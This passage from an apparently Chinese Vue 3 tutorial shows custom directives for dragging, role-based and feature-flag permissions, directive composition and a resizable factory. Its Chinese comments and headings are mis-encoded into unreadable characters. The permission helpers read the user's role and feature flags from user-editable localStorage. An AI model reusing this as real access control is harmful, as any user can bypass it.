        <span class="hljs-keyword">const</span> boundary = <span class="hljs-keyword">typeof</span> config.<span class="hljs-property">boundary</span> === <span class="hljs-string">'string'</span>
          ? <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(config.<span class="hljs-property">boundary</span>)
          : config.<span class="hljs-property">boundary</span>
        
        <span class="hljs-keyword">if</span> (boundary) {
          <span class="hljs-keyword">const</span> boundRect = boundary.<span class="hljs-title function_">getBoundingClientRect</span>()
          <span class="hljs-keyword">const</span> elRect = el.<span class="hljs-title function_">getBoundingClientRect</span>()
          
          <span class="hljs-comment">// é™åˆ¶åœ¨è¾¹ç•Œå†…</span>
          el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetX</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(
            boundRect.<span class="hljs-property">left</span> - elRect.<span class="hljs-property">left</span>,
            <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetX</span>, boundRect.<span class="hljs-property">right</span> - elRect.<span class="hljs-property">right</span>)
          )
          
          el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetY</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(
            boundRect.<span class="hljs-property">top</span> - elRect.<span class="hljs-property">top</span>,
            <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetY</span>, boundRect.<span class="hljs-property">bottom</span> - elRect.<span class="hljs-property">bottom</span>)
          )
        }
      }
      
      <span class="hljs-comment">// æ›´æ–°å…‹éš†å…ƒç´ ä½ç½®</span>
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">clone</span>) {
        el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">clone</span>.<span class="hljs-property">style</span>.<span class="hljs-property">transform</span> = 
          <span class="hljs-string">`translate(<span class="hljs-subst">${el._dragState.offsetX}</span>px, <span class="hljs-subst">${el._dragState.offsetY}</span>px)`</span>
      }
      
      <span class="hljs-comment">// è§¦å‘ç§»åŠ¨å›è°ƒ</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> config.<span class="hljs-property">onMove</span> === <span class="hljs-string">'function'</span>) {
        config.<span class="hljs-title function_">onMove</span>(e, el, {
          <span class="hljs-attr">offsetX</span>: el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetX</span>,
          <span class="hljs-attr">offsetY</span>: el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetY</span>,
          deltaX,
          deltaY
        })
      }
    }
    
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">onDragEnd</span> = (<span class="hljs-params">e</span>) =&gt; {
      <span class="hljs-keyword">if</span> (!el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">isDragging</span>) <span class="hljs-keyword">return</span>
      
      el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">isDragging</span> = <span class="hljs-literal">false</span>
      
      <span class="hljs-comment">// ç§»é™¤å…‹éš†å…ƒç´ </span>
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">clone</span>) {
        <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">clone</span>)
        el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">clone</span> = <span class="hljs-literal">null</span>
      }
      
      <span class="hljs-comment">// è§¦å‘ç»“æŸå›è°ƒ</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> config.<span class="hljs-property">onEnd</span> === <span class="hljs-string">'function'</span>) {
        config.<span class="hljs-title function_">onEnd</span>(e, el, {
          <span class="hljs-attr">offsetX</span>: el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetX</span>,
          <span class="hljs-attr">offsetY</span>: el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetY</span>,
          <span class="hljs-attr">success</span>: e.<span class="hljs-property">dataTransfer</span>.<span class="hljs-property">dropEffect</span> !== <span class="hljs-string">'none'</span>
        })
      }
      
      <span class="hljs-comment">// é‡ç½®çŠ¶æ€</span>
      el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetX</span> = <span class="hljs-number">0</span>
      el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetY</span> = <span class="hljs-number">0</span>
      
      <span class="hljs-comment">// ç§»é™¤æ‹–æ‹½æ ·å¼</span>
      el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'dragging'</span>)
    }
    
    <span class="hljs-comment">// ç»‘å®šäº‹ä»¶</span>
    dragHandle.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'dragstart'</span>, onDragStart)
    dragHandle.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'drag'</span>, onDrag)
    dragHandle.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'dragend'</span>, onDragEnd)
    
    <span class="hljs-comment">// å­˜å‚¨äº‹ä»¶å¤„ç†å‡½æ•°ä»¥ä¾¿æ¸…ç†</span>
    el.<span class="hljs-property">_dragHandlers</span> = { onDragStart, onDrag, onDragEnd }
  },
  
  <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">const</span> config = el.<span class="hljs-property">_dragConfig</span>
    <span class="hljs-keyword">const</span> newValue = binding.<span class="hljs-property">value</span>
    
    <span class="hljs-comment">// æ›´æ–°é…ç½®</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> newValue === <span class="hljs-string">'object'</span>) {
      <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(config, newValue)
    }
    
    <span class="hljs-comment">// æ›´æ–° draggable å±æ€§</span>
    el.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">'draggable'</span>, !config.<span class="hljs-property">disabled</span>)
    
    <span class="hljs-comment">// å¦‚æœç¦ç”¨çŠ¶æ€å˜åŒ–</span>
    <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">oldValue</span>?.<span class="hljs-property">disabled</span> !== config.<span class="hljs-property">disabled</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ‹–æ‹½æŒ‡ä»¤ç¦ç”¨çŠ¶æ€å˜åŒ–:'</span>, config.<span class="hljs-property">disabled</span>)
    }
  },
  
  <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">el</span>) {
    <span class="hljs-keyword">const</span> dragHandle = el.<span class="hljs-property">_dragConfig</span>?.<span class="hljs-property">handle</span> 
      ? el.<span class="hljs-title function_">querySelector</span>(el.<span class="hljs-property">_dragConfig</span>.<span class="hljs-property">handle</span>) 
      : el
    
    <span class="hljs-keyword">const</span> handlers = el.<span class="hljs-property">_dragHandlers</span>
    
    <span class="hljs-keyword">if</span> (dragHandle &amp;&amp; handlers) {
      dragHandle.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'dragstart'</span>, handlers.<span class="hljs-property">onDragStart</span>)
      dragHandle.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'drag'</span>, handlers.<span class="hljs-property">onDrag</span>)
      dragHandle.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'dragend'</span>, handlers.<span class="hljs-property">onDragEnd</span>)
    }
    
    <span class="hljs-comment">// æ¸…ç†å…‹éš†å…ƒç´ </span>
    <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_dragState</span>?.<span class="hljs-property">clone</span> &amp;&amp; <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">contains</span>(el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">clone</span>)) {
      <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">clone</span>)
    }
    
    <span class="hljs-comment">// æ¸…ç†å¼•ç”¨</span>
    <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_dragConfig</span>
    <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_dragState</span>
    <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_dragHandlers</span>
  }
}

<span class="hljs-comment">// ç”¨æ³•ç¤ºä¾‹</span>
<span class="hljs-comment">// &lt;div v-drag="dragData"&gt;å¯æ‹–æ‹½&lt;/div&gt;</span>
<span class="hljs-comment">// &lt;div v-drag.copy&gt;å¤åˆ¶æ¨¡å¼&lt;/div&gt;</span>
<span class="hljs-comment">// &lt;div v-drag.x&gt;ä»…æ°´å¹³æ‹–æ‹½&lt;/div&gt;</span>
<span class="hljs-comment">// &lt;div v-drag="{ data: item, disabled: !isEditable, onEnd: handleDrop }"&gt;</span>
<span class="hljs-comment">// &lt;div v-drag.clone&gt;æ‹–æ‹½æ—¶æ˜¾ç¤ºå…‹éš†&lt;/div&gt;</span>
<span class="hljs-comment">// &lt;div v-drag.no-ghost&gt;ä¸æ˜¾ç¤ºå¹½çµå›¾åƒ&lt;/div&gt;</span>
</code></pre>
<h4 data-id="heading-12">3.5 æƒé™æ§åˆ¶æŒ‡ä»¤</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æƒé™æ§åˆ¶æŒ‡ä»¤é›†</span>
<span class="hljs-keyword">const</span> permissionDirectives = {
  <span class="hljs-comment">// è§’è‰²æƒé™æŒ‡ä»¤</span>
  <span class="hljs-attr">role</span>: {
    <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params">el, binding</span>) {
      <span class="hljs-keyword">const</span> { value, modifiers, arg } = binding
      
      <span class="hljs-comment">// è·å–å½“å‰ç”¨æˆ·è§’è‰²</span>
      <span class="hljs-keyword">const</span> userRole = <span class="hljs-title function_">getCurrentUserRole</span>()
      
      <span class="hljs-comment">// æ£€æŸ¥æƒé™</span>
      <span class="hljs-keyword">const</span> hasPermission = <span class="hljs-title function_">checkRolePermission</span>(userRole, value, arg)
      
      <span class="hljs-comment">// æ ¹æ®æƒé™æ˜¾ç¤º/éšè—å…ƒç´ </span>
      <span class="hljs-keyword">if</span> (!hasPermission) {
        <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">hide</span>) {
          <span class="hljs-comment">// éšè—å…ƒç´ </span>
          el.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>
          el.<span class="hljs-property">_originalDisplay</span> = el.<span class="hljs-property">style</span>.<span class="hljs-property">display</span>
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">disable</span>) {
          <span class="hljs-comment">// ç¦ç”¨å…ƒç´ </span>
          el.<span class="hljs-property">disabled</span> = <span class="hljs-literal">true</span>
          el.<span class="hljs-property">_originalDisabled</span> = el.<span class="hljs-property">disabled</span>
          el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'disabled'</span>)
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">remove</span>) {
          <span class="hljs-comment">// ç§»é™¤å…ƒç´ </span>
          el.<span class="hljs-property">parentNode</span>?.<span class="hljs-title function_">removeChild</span>(el)
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-comment">// é»˜è®¤ï¼šéšè—å…ƒç´ </span>
          el.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>
          el.<span class="hljs-property">_originalDisplay</span> = el.<span class="hljs-property">style</span>.<span class="hljs-property">display</span>
        }
      }
      
      <span class="hljs-comment">// å­˜å‚¨æƒé™ä¿¡æ¯</span>
      el.<span class="hljs-property">_permissionInfo</span> = {
        <span class="hljs-attr">required</span>: value,
        userRole,
        hasPermission,
        <span class="hljs-attr">action</span>: arg || <span class="hljs-string">'view'</span>
      }
    },
    
    <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
      <span class="hljs-keyword">const</span> oldPermission = el.<span class="hljs-property">_permissionInfo</span>
      <span class="hljs-keyword">const</span> newValue = binding.<span class="hljs-property">value</span>
      
      <span class="hljs-comment">// é‡æ–°æ£€æŸ¥æƒé™</span>
      <span class="hljs-keyword">const</span> userRole = <span class="hljs-title function_">getCurrentUserRole</span>()
      <span class="hljs-keyword">const</span> hasPermission = <span class="hljs-title function_">checkRolePermission</span>(userRole, newValue, binding.<span class="hljs-property">arg</span>)
      
      <span class="hljs-comment">// å¦‚æœæƒé™çŠ¶æ€å˜åŒ–</span>
      <span class="hljs-keyword">if</span> (oldPermission.<span class="hljs-property">hasPermission</span> !== hasPermission) {
        <span class="hljs-comment">// æ¢å¤åŸå§‹çŠ¶æ€</span>
        <span class="hljs-keyword">if</span> (oldPermission.<span class="hljs-property">hasPermission</span> === <span class="hljs-literal">false</span>) {
          <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">hide</span> &amp;&amp; el.<span class="hljs-property">_originalDisplay</span> !== <span class="hljs-literal">undefined</span>) {
            el.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = el.<span class="hljs-property">_originalDisplay</span>
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">disable</span> &amp;&amp; el.<span class="hljs-property">_originalDisabled</span> !== <span class="hljs-literal">undefined</span>) {
            el.<span class="hljs-property">disabled</span> = el.<span class="hljs-property">_originalDisabled</span>
            el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'disabled'</span>)
          }
        }
        
        <span class="hljs-comment">// åº”ç”¨æ–°æƒé™</span>
        <span class="hljs-keyword">if</span> (!hasPermission) {
          <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">hide</span>) {
            el.<span class="hljs-property">_originalDisplay</span> = el.<span class="hljs-property">style</span>.<span class="hljs-property">display</span>
            el.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">disable</span>) {
            el.<span class="hljs-property">_originalDisabled</span> = el.<span class="hljs-property">disabled</span>
            el.<span class="hljs-property">disabled</span> = <span class="hljs-literal">true</span>
            el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'disabled'</span>)
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">remove</span>) {
            el.<span class="hljs-property">parentNode</span>?.<span class="hljs-title function_">removeChild</span>(el)
          }
        }
        
        <span class="hljs-comment">// æ›´æ–°æƒé™ä¿¡æ¯</span>
        el.<span class="hljs-property">_permissionInfo</span> = {
          <span class="hljs-attr">required</span>: newValue,
          userRole,
          hasPermission,
          <span class="hljs-attr">action</span>: binding.<span class="hljs-property">arg</span> || <span class="hljs-string">'view'</span>
        }
      }
    },
    
    <span class="hljs-title function_">unmounted</span>(<span class="hljs-params">el</span>) {
      <span class="hljs-comment">// æ¸…ç†</span>
      <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_permissionInfo</span>
      <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_originalDisplay</span>
      <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_originalDisabled</span>
    }
  },
  
  <span class="hljs-comment">// åŠŸèƒ½æƒé™æŒ‡ä»¤</span>
  <span class="hljs-attr">feature</span>: {
    <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
      <span class="hljs-keyword">const</span> { value, modifiers } = binding
      
      <span class="hljs-comment">// æ£€æŸ¥åŠŸèƒ½æ˜¯å¦å¯ç”¨</span>
      <span class="hljs-keyword">const</span> isEnabled = <span class="hljs-title function_">checkFeatureEnabled</span>(value)
      
      <span class="hljs-keyword">if</span> (!isEnabled) {
        <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">hide</span>) {
          el.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">disable</span>) {
          el.<span class="hljs-property">disabled</span> = <span class="hljs-literal">true</span>
          el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'disabled'</span>)
        } <span class="hljs-keyword">else</span> {
          el.<span class="hljs-property">style</span>.<span class="hljs-property">opacity</span> = <span class="hljs-string">'0.5'</span>
          el.<span class="hljs-property">style</span>.<span class="hljs-property">pointerEvents</span> = <span class="hljs-string">'none'</span>
        }
      }
      
      el.<span class="hljs-property">_featureInfo</span> = {
        <span class="hljs-attr">feature</span>: value,
        <span class="hljs-attr">enabled</span>: isEnabled
      }
    },
    
    <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
      <span class="hljs-keyword">const</span> isEnabled = <span class="hljs-title function_">checkFeatureEnabled</span>(binding.<span class="hljs-property">value</span>)
      
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_featureInfo</span>.<span class="hljs-property">enabled</span> !== isEnabled) {
        <span class="hljs-keyword">if</span> (isEnabled) {
          <span class="hljs-comment">// æ¢å¤</span>
          <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">hide</span>) {
            el.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">''</span>
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">disable</span>) {
            el.<span class="hljs-property">disabled</span> = <span class="hljs-literal">false</span>
            el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'disabled'</span>)
          } <span class="hljs-keyword">else</span> {
            el.<span class="hljs-property">style</span>.<span class="hljs-property">opacity</span> = <span class="hljs-string">''</span>
            el.<span class="hljs-property">style</span>.<span class="hljs-property">pointerEvents</span> = <span class="hljs-string">''</span>
          }
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-comment">// ç¦ç”¨</span>
          <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">hide</span>) {
            el.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">disable</span>) {
            el.<span class="hljs-property">disabled</span> = <span class="hljs-literal">true</span>
            el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'disabled'</span>)
          } <span class="hljs-keyword">else</span> {
            el.<span class="hljs-property">style</span>.<span class="hljs-property">opacity</span> = <span class="hljs-string">'0.5'</span>
            el.<span class="hljs-property">style</span>.<span class="hljs-property">pointerEvents</span> = <span class="hljs-string">'none'</span>
          }
        }
        
        el.<span class="hljs-property">_featureInfo</span> = {
          <span class="hljs-attr">feature</span>: binding.<span class="hljs-property">value</span>,
          <span class="hljs-attr">enabled</span>: isEnabled
        }
      }
    },
    
    <span class="hljs-title function_">unmounted</span>(<span class="hljs-params">el</span>) {
      <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_featureInfo</span>
    }
  }
}

<span class="hljs-comment">// å·¥å…·å‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getCurrentUserRole</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// ä»Vuexã€Piniaæˆ–localStorageè·å–</span>
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'userRole'</span>) || <span class="hljs-string">'guest'</span>
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">checkRolePermission</span>(<span class="hljs-params">userRole, required, action = <span class="hljs-string">'view'</span></span>) {
  <span class="hljs-comment">// æƒé™é…ç½®</span>
  <span class="hljs-keyword">const</span> permissions = {
    <span class="hljs-attr">admin</span>: [<span class="hljs-string">'create'</span>, <span class="hljs-string">'read'</span>, <span class="hljs-string">'update'</span>, <span class="hljs-string">'delete'</span>, <span class="hljs-string">'manage'</span>],
    <span class="hljs-attr">editor</span>: [<span class="hljs-string">'create'</span>, <span class="hljs-string">'read'</span>, <span class="hljs-string">'update'</span>],
    <span class="hljs-attr">viewer</span>: [<span class="hljs-string">'read'</span>],
    <span class="hljs-attr">guest</span>: []
  }
  
  <span class="hljs-comment">// å¦‚æœæ˜¯æ•°ç»„ï¼Œæ£€æŸ¥ä»»æ„ä¸€ä¸ª</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(required)) {
    <span class="hljs-keyword">return</span> required.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">role</span> =&gt;</span> 
      permissions[userRole]?.<span class="hljs-title function_">includes</span>(action) &amp;&amp; role === userRole
    )
  }
  
  <span class="hljs-comment">// å¦‚æœæ˜¯å­—ç¬¦ä¸²ï¼Œç²¾ç¡®åŒ¹é…</span>
  <span class="hljs-keyword">return</span> permissions[userRole]?.<span class="hljs-title function_">includes</span>(action) &amp;&amp; required === userRole
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">checkFeatureEnabled</span>(<span class="hljs-params">feature</span>) {
  <span class="hljs-comment">// ä»é…ç½®æˆ–ç‰¹æ€§å¼€å…³è·å–</span>
  <span class="hljs-keyword">const</span> featureFlags = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'featureFlags'</span>) || <span class="hljs-string">'{}'</span>)
  <span class="hljs-keyword">return</span> featureFlags[feature] !== <span class="hljs-literal">false</span>
}

<span class="hljs-comment">// ç”¨æ³•ç¤ºä¾‹</span>
<span class="hljs-comment">// &lt;button v-role="'admin'"&gt;ä»…ç®¡ç†å‘˜å¯è§&lt;/button&gt;</span>
<span class="hljs-comment">// &lt;button v-role="['admin', 'editor']"&gt;ç®¡ç†å‘˜å’Œç¼–è¾‘å¯è§&lt;/button&gt;</span>
<span class="hljs-comment">// &lt;button v-role:edit="'admin'"&gt;ç®¡ç†å‘˜å¯ç¼–è¾‘&lt;/button&gt;</span>
<span class="hljs-comment">// &lt;button v-role.hide="'admin'"&gt;éç®¡ç†å‘˜éšè—&lt;/button&gt;</span>
<span class="hljs-comment">// &lt;button v-role.disable="'admin'"&gt;éç®¡ç†å‘˜ç¦ç”¨&lt;/button&gt;</span>
<span class="hljs-comment">// &lt;div v-feature="'newUI'"&gt;æ–°UIåŠŸèƒ½&lt;/div&gt;</span>
<span class="hljs-comment">// &lt;div v-feature.disable="'betaFeature'"&gt;æµ‹è¯•åŠŸèƒ½&lt;/div&gt;</span>
</code></pre>
<h3 data-id="heading-13">å››ã€æŒ‡ä»¤ç»„åˆä¸å¤ç”¨</h3>
<h4 data-id="heading-14">4.1 æŒ‡ä»¤ç»„åˆå™¨</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æŒ‡ä»¤ç»„åˆå™¨ï¼šå°†å¤šä¸ªæŒ‡ä»¤ç»„åˆæˆä¸€ä¸ª</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createDirectiveComposer</span>(<span class="hljs-params">...directives</span>) {
  <span class="hljs-keyword">return</span> {
    <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params">...args</span>) {
      directives.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">directive</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (directive.<span class="hljs-property">beforeMount</span>) directive.<span class="hljs-title function_">beforeMount</span>(...args)
      })
    },
    
    <span class="hljs-title function_">mounted</span>(<span class="hljs-params">...args</span>) {
      directives.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">directive</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (directive.<span class="hljs-property">mounted</span>) directive.<span class="hljs-title function_">mounted</span>(...args)
      })
    },
    
    <span class="hljs-title function_">beforeUpdate</span>(<span class="hljs-params">...args</span>) {
      directives.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">directive</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (directive.<span class="hljs-property">beforeUpdate</span>) directive.<span class="hljs-title function_">beforeUpdate</span>(...args)
      })
    },
    
    <span class="hljs-title function_">updated</span>(<span class="hljs-params">...args</span>) {
      directives.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">directive</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (directive.<span class="hljs-property">updated</span>) directive.<span class="hljs-title function_">updated</span>(...args)
      })
    },
    
    <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">...args</span>) {
      directives.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">directive</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (directive.<span class="hljs-property">beforeUnmount</span>) directive.<span class="hljs-title function_">beforeUnmount</span>(...args)
      })
    },
    
    <span class="hljs-title function_">unmounted</span>(<span class="hljs-params">...args</span>) {
      directives.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">directive</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (directive.<span class="hljs-property">unmounted</span>) directive.<span class="hljs-title function_">unmounted</span>(...args)
      })
    }
  }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> vTooltip = {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
    el.<span class="hljs-property">title</span> = binding.<span class="hljs-property">value</span>
    el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'has-tooltip'</span>)
  },
  <span class="hljs-title function_">unmounted</span>(<span class="hljs-params">el</span>) {
    el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'has-tooltip'</span>)
  }
}

<span class="hljs-keyword">const</span> vHighlight = {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">value</span>) {
      el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'highlight'</span>)
    }
  },
  <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">value</span>) {
      el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'highlight'</span>)
    } <span class="hljs-keyword">else</span> {
      el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'highlight'</span>)
    }
  }
}

<span class="hljs-comment">// ç»„åˆæŒ‡ä»¤</span>
<span class="hljs-keyword">const</span> vTooltipHighlight = <span class="hljs-title function_">createDirectiveComposer</span>(vTooltip, vHighlight)

<span class="hljs-comment">// æ³¨å†Œ</span>
app.<span class="hljs-title function_">directive</span>(<span class="hljs-string">'tooltip-highlight'</span>, vTooltipHighlight)

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-comment">// &lt;div v-tooltip-highlight="'æç¤ºæ–‡æœ¬'"&gt;å†…å®¹&lt;/div&gt;</span>
</code></pre>
<h4 data-id="heading-15">4.2 æŒ‡ä»¤å·¥å‚å‡½æ•°</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æŒ‡ä»¤å·¥å‚ï¼šåˆ›å»ºå¯é…ç½®çš„æŒ‡ä»¤</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createResizableDirective</span>(<span class="hljs-params">options = {}</span>) {
  <span class="hljs-keyword">const</span> defaultOptions = {
    <span class="hljs-attr">handles</span>: [<span class="hljs-string">'right'</span>, <span class="hljs-string">'bottom'</span>, <span class="hljs-string">'bottom-right'</span>],
    <span class="hljs-attr">minWidth</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">minHeight</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">maxWidth</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-attr">maxHeight</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-attr">onResize</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-attr">onResizeStart</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-attr">onResizeEnd</span>: <span class="hljs-literal">null</span>
  }
  
  <span class="hljs-keyword">const</span> config = { ...defaultOptions, ...options }
  
  <span class="hljs-keyword">return</span> {
    <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
      <span class="hljs-keyword">const</span> instanceOptions = <span class="hljs-keyword">typeof</span> binding.<span class="hljs-property">value</span> === <span class="hljs-string">'object'</span> 
        ? { ...config, ...binding.<span class="hljs-property">value</span> }
        : config
      
      <span class="hljs-comment">// åˆ›å»ºè°ƒæ•´å¤§å°çš„æ‰‹æŸ„</span>
      <span class="hljs-keyword">const</span> handles = instanceOptions.<span class="hljs-property">handles</span>
      <span class="hljs-keyword">const</span> handleElements = []
      
      handles.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">handle</span> =&gt;</span> {
        <span class="hljs-keyword">const</span> handleEl = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>)
